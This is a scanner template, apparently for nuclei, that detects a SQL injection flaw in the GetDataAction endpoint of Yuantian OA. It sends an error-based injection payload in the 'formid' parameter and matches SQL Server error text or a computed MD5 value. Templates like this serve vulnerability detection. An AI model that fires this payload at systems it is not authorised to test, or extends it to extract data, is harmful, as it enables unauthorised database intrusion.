id: poc-yaml-yuantian-oa-getdataaction-sqli
info:
  name: 源天OA GetDataAction SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
variables:
  t1: '{{rand_int(100, 10000)}}'
  t2: '{{md5(t1)}}'
http:
  - raw:
      - |
        GET /ServiceAction/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=-1%27%20OR%207063%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))))%20AND%20%27a%27=%27a HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "转换成数据类型 int 时失败"
          - "在将 nvarchar 值"
          - "{{t2}}"
        part: body
